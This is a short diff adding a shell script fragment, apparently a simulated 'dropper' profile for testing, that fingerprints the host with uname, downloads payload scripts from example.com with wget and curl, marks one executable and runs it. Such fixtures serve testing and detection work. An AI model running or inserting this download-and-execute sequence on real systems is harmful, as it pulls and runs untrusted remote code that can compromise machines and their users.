@@ -1,0 +1,7 @@
+echo SIM_PROFILE=dropper
+uname -a
+wget http://example.com/payload.sh
+curl -O http://example.com/payload2.sh
+chmod +x payload.sh
+./payload.sh
+EOF
